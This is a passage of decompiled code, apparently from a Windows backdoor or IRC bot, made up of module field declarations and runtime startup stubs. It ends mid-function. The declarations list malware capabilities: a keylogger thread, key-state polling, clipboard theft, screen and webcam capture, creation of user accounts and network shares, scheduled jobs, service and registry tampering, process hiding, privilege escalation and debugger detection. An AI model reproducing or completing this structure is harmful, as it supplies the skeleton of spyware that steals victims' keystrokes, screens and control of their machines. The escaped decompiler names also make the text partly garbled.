  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D131;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D132;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D133;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D134;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0O\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D135;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CB_W \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D136;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BI\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D137;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BJ\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D138;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BK\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D139;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BI\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D140;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BK\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D141;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BH\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D142;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BI\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D143;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BJ\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D144;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BG\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D145;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BK\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D146;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BI\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D147;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BK\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D148;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BH\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D149;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BJ\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D150;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BI\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D151;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BK\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D152;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BM\u0040\u0024\u0024CBD \u003FA0xc96a6a37\u002Eunnamed\u002Dglobal\u002D153;
  internal static __FnPtr<int (uint, sbyte*, int, int)> frecv;
  internal static __FnPtr<int (uint, sockaddr*, int*)> fgetsockname;
  internal static __FnPtr<uint (char*, byte**)> fNetRemoteTOD;
  internal static __FnPtr<int (char*, uint, uint, URL_COMPONENTSW*)> fInternetCrackUrl;
  internal static __FnPtr<uint (int, int, int, _WSAPROTOCOL_INFOW*, uint, uint)> fWSASocket;
  internal static __FnPtr<int (uint*, uint)> fInternetGetConnectedState;
  internal static __FnPtr<uint (char*)> fGetDriveType;
  internal static __FnPtr<int ()> fCloseClipboard;
  internal static uint noicmperr;
  internal static __FnPtr<int (HWND__*)> fIsWindow;
  internal static __FnPtr<int (uint, sbyte*, int, int, sockaddr*, int*)> frecvfrom;
  internal static __FnPtr<void* (HDC__*, void*)> fSelectObject;
  internal static __FnPtr<uint (char*, uint, int)> fWNetCancelConnection2W;
  internal static int noicmp;
  internal static __FnPtr<int (uint, int, uint*)> fioctlsocket;
  internal static __FnPtr<void* (char*, uint, char*, char*, uint)> fInternetOpen;
  internal static __FnPtr<int (HWND__*)> fOpenClipboard;
  internal static __FnPtr<short (int)> fGetAsyncKeyState;
  internal static __FnPtr<int (void*, tagPROCESSENTRY32W*)> fProcess32Next;
  internal static __FnPtr<uint (char*, byte*, uint*)> fNetScheduleJobAdd;
  internal static uint nowinineterr;
  internal static int noadvapi32;
  internal static __FnPtr<int (uint, sockaddr*, int)> fconnect;
  internal static uint noavicap32err;
  internal static __FnPtr<int (HWND__*, char*, int)> fGetWindowText;
  internal static __FnPtr<short (void*, int, void*, int)> fSQLSetEnvAttr;
  internal static __FnPtr<int (HKEY__*, char*, uint*, uint*, byte*, uint*)> fRegQueryValueEx;
  internal static __FnPtr<uint (uint, sockaddr*, int*)> faccept;
  internal static int noshell32;
  internal static __FnPtr<HWND__* ()> fGetForegroundWindow;
  internal static uint nonetapi32err;
  internal static __FnPtr<short (void*)> fSQLDisconnect;
  internal static __FnPtr<uint (char*, uint, byte*, uint*)> fNetUserAdd;
  internal static __FnPtr<int (uint, sbyte*, int, int, sockaddr*, int)> fsendto;
  internal static __FnPtr<void (int, uint, void*, void*)> fSHChangeNotify;
  internal static __FnPtr<uint (uint)> fSetErrorMode;
  internal static __FnPtr<uint (char*, uint, int)> fWNetCancelConnection2;
  internal static int nompr;
  internal static __FnPtr<uint (char*, uint, uint, byte**, uint, uint*, uint*, uint*)> fNetUserEnum;
  internal static __FnPtr<int (HKEY__*, char*, uint, uint, byte*, uint)> fRegSetValueEx;
  internal static __FnPtr<uint (char*, uint, byte*, uint*)> fNetShareAdd;
  internal static __FnPtr<uint (char*, char*, uint, byte**)> fNetUserGetInfo;
  internal static int noodbc32;
  internal static __FnPtr<void* (uint, uint)> fCreateToolhelp32Snapshot;
  internal static __FnPtr<int (SC_HANDLE__*)> fDeleteService;
  internal static __FnPtr<int (HWND__*)> fDestroyWindow;
  internal static __FnPtr<int (char*, _ULARGE_INTEGER*, _ULARGE_INTEGER*, _ULARGE_INTEGER*)> fGetDiskFreeSpaceEx;
  internal static __FnPtr<uint (int, int, int)> fsocket;
  internal static __FnPtr<uint (char*, char*, uint)> fNetShareDel;
  internal static __FnPtr<void* (void*, char*, char*, uint, uint, uint*)> fInternetOpenUrl;
  internal static __FnPtr<uint (_MIB_IPNETTABLE*, uint*, int)> fGetIpNetTable;
  internal static __FnPtr<int (ushort, WSAData*)> fWSAStartup;
  internal static __FnPtr<uint (char*, char*, char*, byte*, uint)> fNetMessageBufferSend;
  internal static uint nodnsapierr;
  internal static uint noshell32err;
  internal static __FnPtr<int (void*, tagMODULEENTRY32W*)> fModule32First;
  internal static uint noadvapi32err;
  internal static uint nomprerr;
  internal static __FnPtr<int (uint, int, int, sbyte*, int)> fsetsockopt;
  internal static __FnPtr<uint (char*, char*, char*, uint, char*, char**)> fSearchPath;
  internal static __FnPtr<short (short, void*, void**)> fSQLAllocHandle;
  internal static __FnPtr<void* (void*, char*, char*, char*, char*, char**, uint, uint*)> fHttpOpenRequest;
  internal static __FnPtr<int (HDC__*)> fDeleteDC;
  internal static __FnPtr<int (SC_HANDLE__*)> fCloseServiceHandle;
  internal static __FnPtr<HWND__* (sbyte*, uint, int, int, int, int, HWND__*, int)> fcapCreateCaptureWindow;
  internal static __FnPtr<void* (void*, char*, ushort, char*, char*, uint, uint, uint*)> fInternetConnect;
  internal static __FnPtr<uint (void*)> fNetApiBufferFree;
  internal static __FnPtr<int (HKEY__*, char*)> fRegDeleteValue;
  internal static __FnPtr<int (uint, sockaddr*, int*)> fgetpeername;
  internal static __FnPtr<int (_LARGE_INTEGER*)> fQueryPerformanceCounter;
  internal static __FnPtr<int (HKEY__*, char*, uint, char*, uint, uint, _SECURITY_ATTRIBUTES*, HKEY__**, uint*)> fRegCreateKeyEx;
  internal static int nouser32;
  internal static __FnPtr<int (void*, tagPROCESSENTRY32W*)> fProcess32First;
  internal static __FnPtr<void* ()> fIcmpCreateFile;
  internal static __FnPtr<int (uint, fd_set*)> __fWSAFDIsSet;
  internal static __FnPtr<HWND__* (char*, char*)> fFindWindow;
  internal static __FnPtr<int (void*)> fInternetCloseHandle;
  internal static uint nogdi32err;
  internal static __FnPtr<hostent* (sbyte*)> fgethostbyname;
  internal static __FnPtr<int (sbyte*)> fDnsFlushResolverCacheEntry_A;
  internal static __FnPtr<int (void*, int, _TOKEN_PRIVILEGES*, uint, _TOKEN_PRIVILEGES*, uint*)> fAdjustTokenPrivileges;
  internal static int nows2_32;
  internal static int nodnsapi;
  internal static __FnPtr<uint (_MIB_IPNETROW_LH*)> fDeleteIpNetEntry;
  internal static __FnPtr<int (HDC__*, int)> fGetDeviceCaps;
  internal static __FnPtr<uint (sbyte*)> finet_addr;
  internal static __FnPtr<HDC__* (HDC__*)> fCreateCompatibleDC;
  internal static int nonetapi32;
  internal static __FnPtr<int (void*)> fDeleteObject;
  internal static __FnPtr<sbyte* (in_addr)> finet_ntoa;
  internal static __FnPtr<int (void*)> fIcmpCloseHandle;
  internal static __FnPtr<int (HDC__*, int, int, int, int, HDC__*, int, int, uint)> fBitBlt;
  internal static __FnPtr<int (uint, HWND__*, uint, int)> fWSAAsyncSelect;
  internal static __FnPtr<int (char*, uint*)> fGetUserName;
  internal static __FnPtr<int (ushort, sbyte*, int, sbyte*, int)> fcapGetDriverDescription;
  internal static __FnPtr<int (uint, sbyte*, int, int)> fsend;
  internal static int noavicap32;
  internal static __FnPtr<int (uint, uint)> fExitWindowsEx;
  internal static __FnPtr<uint (uint, char*)> fGetLogicalDriveStrings;
  internal static __FnPtr<uint (_NETRESOURCEW*, char*, char*, uint)> fWNetAddConnection2;
  internal static int nogdi32;
  internal static __FnPtr<int (int, fd_set*, fd_set*, fd_set*, timeval*)> fselect;
  internal static __FnPtr<int (_LARGE_INTEGER*)> fQueryPerformanceFrequency;
  internal static __FnPtr<int (void*, void*, uint, uint*)> fInternetReadFile;
  internal static __FnPtr<short (short, void*)> fSQLFreeHandle;
  internal static __FnPtr<uint (HDC__*, uint, uint, tagRGBQUAD*)> fGetDIBColorTable;
  internal static int nowininet;
  internal static uint nows2_32err;
  internal static __FnPtr<int ()> fWSAGetLastError;
  internal static __FnPtr<SC_HANDLE__* (char*, char*, uint)> fOpenSCManager;
  internal static __FnPtr<int (HWND__*, uint, uint, int)> fSendMessage;
  internal static __FnPtr<int (SC_HANDLE__*, uint, char**)> fStartService;
  internal static __FnPtr<uint (char*, char*)> fNetUserDel;
  internal static uint nokernel32err;
  internal static __FnPtr<int (SC_HANDLE__*, uint, uint, _ENUM_SERVICE_STATUSW*, uint, uint*, uint*, uint*)> fEnumServicesStatus;
  internal static __FnPtr<uint (uint)> fntohl;
  internal static int noiphlpapi;
  internal static __FnPtr<int (uint, uint, void*, uint, void*, uint, uint*, _OVERLAPPED*, __FnPtr<void (uint, uint, _OVERLAPPED*, uint)>)> fWSAIoctl;
  internal static __FnPtr<int (uint, sockaddr*, int)> fbind;
  internal static __FnPtr<int (HKEY__*)> fRegCloseKey;
  internal static __FnPtr<int (SC_HANDLE__*, uint, _SERVICE_STATUS*)> fControlService;
  internal static __FnPtr<int ()> fDnsFlushResolverCache;
  internal static __FnPtr<uint (void*, uint, void*, ushort, ip_option_information*, void*, uint, uint)> fIcmpSendEcho;
  internal static __FnPtr<short (void*, HWND__*, byte*, short, byte*, short, short*, ushort)> fSQLDriverConnect;
  internal static __FnPtr<hostent* (sbyte*, int, int)> fgethostbyaddr;
  internal static __FnPtr<ushort (ushort)> fntohs;
  internal static uint nouser32err;
  internal static __FnPtr<int (void*)> fIsValidSecurityDescriptor;
  internal static __FnPtr<uint (uint, uint)> fRegisterServiceProcess;
  internal static __FnPtr<uint (char*, uint, byte**, uint, uint*, uint*, uint*)> fNetShareEnum;
  internal static __FnPtr<short (void*, byte*, int)> fSQLExecDirect;
  internal static __FnPtr<HINSTANCE__* (HWND__*, char*, char*, char*, char*, int)> fShellExecute;
  internal static __FnPtr<int (uint)> fclosesocket;
  internal static __FnPtr<HBITMAP__* (HDC__*, tagBITMAPINFO*, uint, void**, void*, uint)> fCreateDIBSection;
  internal static int nokernel32;
  internal static __FnPtr<int (sbyte*, int)> fgethostname;
  internal static __FnPtr<int ()> fWSACleanup;
  internal static __FnPtr<int (char*, char*, _LUID*)> fLookupPrivilegeValue;
  internal static __FnPtr<short (int)> fGetKeyState;
  internal static uint noiphlpapierr;
  internal static __FnPtr<int (uint, int)> flisten;
  internal static uint noodbc32err;
  internal static __FnPtr<uint (uint)> fhtonl;
  internal static __FnPtr<int (HKEY__*, char*, uint, uint, HKEY__**)> fRegOpenKeyEx;
  internal static __FnPtr<void* (uint)> fGetClipboardData;
  internal static __FnPtr<uint (_NETRESOURCEW*, char*, char*, uint)> fWNetAddConnection2W;
  internal static __FnPtr<int (void*, uint, void**)> fOpenProcessToken;
  internal static __FnPtr<SC_HANDLE__* (SC_HANDLE__*, char*, uint)> fOpenService;
  internal static __FnPtr<HDC__* (char*, char*, char*, _devicemodeW*)> fCreateDC;
  internal static unsafe void* ih;
  internal static __FnPtr<int (void*, char*, uint, void*, uint)> fHttpSendRequest;
  internal static __FnPtr<int (uint*, char*, uint, uint)> fInternetGetConnectedStateEx;
  internal static __FnPtr<ushort (ushort)> fhtons;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BE\u0040\u0024\u0024CB_W \u003FA0x5e48b7d6\u002Eunnamed\u002Dglobal\u002D0;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00\u0024\u0024CBD \u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D0;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D1;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CBD \u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D2;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CL\u0040\u0024\u0024CBD \u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D3;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CM\u0040\u0024\u0024CBD \u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D4;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CA\u0040\u0024\u0024CBD \u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D5;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CK\u0040\u0024\u0024CBD \u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D6;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CL\u0040\u0024\u0024CBD \u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D7;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xb0ecf957\u002Eunnamed\u002Dglobal\u002D8;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BA\u0040D \u003FA0xb0ecf957\u002E\u003FIP\u0040\u003F1\u003F\u003FGetIP\u0040\u0040YAPADI\u0040Z\u00404PADA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CF\u0040\u0024\u0024CB_W \u003FA0x38b67ec0\u002Eunnamed\u002Dglobal\u002D0;
  internal static \u0024ArrayType\u0024\u0024\u0024BY09\u0024\u0024CB_W \u003FA0x38b67ec0\u002Eunnamed\u002Dglobal\u002D1;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D0;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D1;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D2;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D3;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D4;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D5;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D6;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D7;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D8;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D9;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D10;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D11;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D12;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D13;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D14;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CB_W \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D15;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D16;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D17;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D18;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CB_W \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D19;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D20;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00\u0024\u0024CBD \u003FA0xa63aa384\u002Eunnamed\u002Dglobal\u002D21;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04URNICK\u0040\u0040 rnick;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D0;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0P\u0040\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D1;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D2;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D3;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D4;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D5;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DO\u0040\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D6;
  internal static \u0024ArrayType\u0024\u0024\u0024BY00\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D7;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D8;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D9;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D10;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D11;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D12;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D13;
  internal static \u0024ArrayType\u0024\u0024\u0024BY04\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D14;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D15;
  internal static \u0024ArrayType\u0024\u0024\u0024BY05\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D16;
  internal static \u0024ArrayType\u0024\u0024\u0024BY03\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D17;
  internal static \u0024ArrayType\u0024\u0024\u0024BY07\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D18;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CB_W \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D19;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BG\u0040\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D20;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0M\u0040\u0024\u0024CB_W \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D21;
  internal static \u0024ArrayType\u0024\u0024\u0024BY08\u0024\u0024CB_W \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D22;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0NL\u0040\u0024\u0024CBD \u003FA0xd82dad53\u002Eunnamed\u002Dglobal\u002D23;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DC\u0040D \u003FA0xd82dad53\u002E\u003Fbuffer\u0040\u003F1\u003F\u003FUptime\u0040\u0040YAPADH\u0040Z\u00404PADA;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BC\u0040\u0024\u0024CBD \u003FA0xf0900698\u002Eunnamed\u002Dglobal\u002D0;
  internal static \u0024ArrayType\u0024\u0024\u0024BY06\u0024\u0024CBD \u003FA0xf0900698\u002Eunnamed\u002Dglobal\u002D1;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CI\u0040\u0024\u0024CBD \u003FA0xf0900698\u002Eunnamed\u002Dglobal\u002D2;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BI\u0040\u0024\u0024CBD \u003FA0xf0900698\u002Eunnamed\u002Dglobal\u002D3;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CB_W \u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D0;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CB_W \u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D1;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BC\u0040\u0024\u0024CBD \u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D2;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DE\u0040\u0024\u0024CBD \u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D3;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CN\u0040\u0024\u0024CBD \u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D4;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0CN\u0040\u0024\u0024CBD \u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D5;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DJ\u0040\u0024\u0024CBD \u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D6;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DF\u0040\u0024\u0024CBD \u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D7;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0DL\u0040\u0024\u0024CBD \u003FA0xa99474a2\u002Eunnamed\u002Dglobal\u002D8;
  internal static int m_bIsDebug;
  static unsafe int** __unep\u0040\u003FIsBPX\u0040\u0040\u0024\u0024FYA_NPAX\u0040Z;
  static unsafe int** __unep\u0040\u003FIsSICELoaded\u0040\u0040\u0024\u0024FYA_NXZ;
  internal static \u0024ArrayType\u0024\u0024\u0024BY01\u0024\u0024CB_W \u003FA0xc25c7cbf\u002Eunnamed\u002Dglobal\u002D0;
  internal static \u0024ArrayType\u0024\u0024\u0024BY02\u0024\u0024CB_W \u003FA0xc25c7cbf\u002Eunnamed\u002Dglobal\u002D1;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0BJ\u0040\u0024\u0024CBD \u003FA0xc25c7cbf\u002Eunnamed\u002Dglobal\u002D2;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0N\u0040\u0024\u0024CB_W \u003FA0xc25c7cbf\u002Eunnamed\u002Dglobal\u002D3;
  internal static \u0024ArrayType\u0024\u0024\u0024BY0FP\u0040UKEYS\u0040\u0040 keys;
  public static unsafe int** __unep\u0040\u003FKeyLoggerThread\u0040\u0040\u0024\u0024FYGKPAX\u0040Z;
  public static \u0024ArrayType\u0024\u0024\u0024BY0A\u0040P6AXXZ __xc_z;
  public static volatile uint __native_vcclrit_reason;
  public static \u0024ArrayType\u0024\u0024\u0024BY0A\u0040P6AXXZ __xc_a;
  public static \u0024ArrayType\u0024\u0024\u0024BY0A\u0040P6AHXZ __xi_a;
  public static volatile __enative_startup_state __native_startup_state;
  public static \u0024ArrayType\u0024\u0024\u0024BY0A\u0040P6AHXZ __xi_z;
  public static volatile unsafe void* __native_startup_lock;
  public static volatile uint __native_dllmain_reason;

  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003CCrtImplementationDetails\u003E\u002ENativeDll\u002EIsInDllMain() => \u003CModule\u003E.__native_dllmain_reason != uint.MaxValue;

  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003CCrtImplementationDetails\u003E\u002ENativeDll\u002EIsInProcessAttach() => \u003CModule\u003E.__native_dllmain_reason == 1U;

  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003CCrtImplementationDetails\u003E\u002ENativeDll\u002EIsInProcessDetach() => \u003CModule\u003E.__native_dllmain_reason == 0U;

  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003CCrtImplementationDetails\u003E\u002ENativeDll\u002EIsInVcclrit() => \u003CModule\u003E.__native_vcclrit_reason != uint.MaxValue;

  [return: MarshalAs(UnmanagedType.U1)]
  internal static bool \u003CCrtImplementationDetails\u003E\u002ENativeDll\u002EIsSafeForManagedCode() => (\u003CModule\u003E.__native_dllmain_reason != uint.MaxValue ? 1 : 0) == 0 || (\u003CModule\u003E.__native_vcclrit_reason != uint.MaxValue ? 1 : 0) != 0 || \u003CModule\u003E.__native_dllmain_reason != 1U && \u003CModule\u003E.__native_dllmain_reason != 0U;

  internal static unsafe int \u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002EDoNothing(
    void* cookie)
  {
    GC.KeepAlive((object) int.MaxValue);
    return 0;
  }

  [return: MarshalAs(UnmanagedType.U1)]
  internal static unsafe bool \u003CCrtImplementationDetails\u003E\u002EDefaultDomain\u002EHasPerProcess()
  {
    if (\u003CModule\u003E.\u003FhasPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A != (TriBool.State) 2)
      return \u003CModule\u003E.\u003FhasPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A == (TriBool.State) -1;
    void** voidPtr = (void**) &\u003CModule\u003E.\u003FA0x250abb45\u002E__xc_mp_a;
    if (ref \u003CModule\u003E.\u003FA0x250abb45\u002E__xc_mp_a < ref \u003CModule\u003E.\u003FA0x250abb45\u002E__xc_mp_z)
    {
      while (*(int*) voidPtr == 0)
      {
        voidPtr += 4;
        if ((IntPtr) voidPtr >= ref \u003CModule\u003E.\u003FA0x250abb45\u002E__xc_mp_z)
          goto label_5;
      }
      \u003CModule\u003E.\u003FhasPerProcess\u0040DefaultDomain\u0040\u003CCrtImplementationDetails\u003E\u0040\u00400W4State\u0040TriBool\u00402\u0040A = (TriBool.State) -1;
      return true;
    }
label_5:
